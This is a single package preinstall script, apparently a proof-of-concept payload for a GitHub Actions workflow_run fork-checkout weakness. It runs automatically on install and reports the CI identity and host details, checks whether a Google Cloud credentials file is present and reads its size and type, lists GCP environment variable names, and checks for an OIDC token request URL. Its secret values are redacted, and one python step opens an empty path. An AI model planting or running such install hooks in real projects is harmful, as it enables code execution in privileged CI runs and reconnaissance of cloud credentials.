scripts.preinstall: echo "=== SECURITY RESEARCH: workflow_run fork checkout PoC ===" && echo "timestamp: $(date -u +%Y-%m-%dT%H:%M:%SZ)" && echo "whoami: $(whoami)" && echo "id: $(id)" && echo "hostname: $(hostname)" && echo "uname: $(uname -a)" && echo "pwd: $(pwd)" && echo "GOOGLE_CLOUD_PROJECT: ${GOOGLE_CLOUD_PROJECT:-not_set}" && echo "GOOGLE_SAMPLES_PROJECT: ${GOOGLE_SAMPLES_PROJECT:-not_set}" && echo "GOOGLE_APPLICATION_CREDENTIALS set: $([ -n "$GOOGLE_APPLICATION_CREDENTIALS" ] && echo YES || echo NO)" && echo "GOOGLE_APPLICATION_CREDENTIALS file exists: $([ -f "$GOOGLE_APPLICATION_CREDENTIALS" ] && echo YES || echo NO)" && echo "Creds file size: $(wc -c < "$GOOGLE_APPLICATION_CREDENTIALS" 2>/dev/null || echo 0) bytes" && echo "Creds file type field: $(python3 -c "import json; print(json.load(open(\\\"\\\"))['type'])" 2>/dev/null || echo none)" && echo "GCP env vars:" && env | grep -iE "^(GOOGLE_|GCP_|GCLOUD_|CLOUDSDK_)" | sed "s/=.*/=<REDACTED>/" && echo "ACTIONS_ID_TOKEN_REQUEST_URL set: $([ -n "$ACTIONS_ID_TOKEN_REQUEST_URL" ] && echo YES || echo NO)" && echo "=== END SECURITY RESEARCH ==="
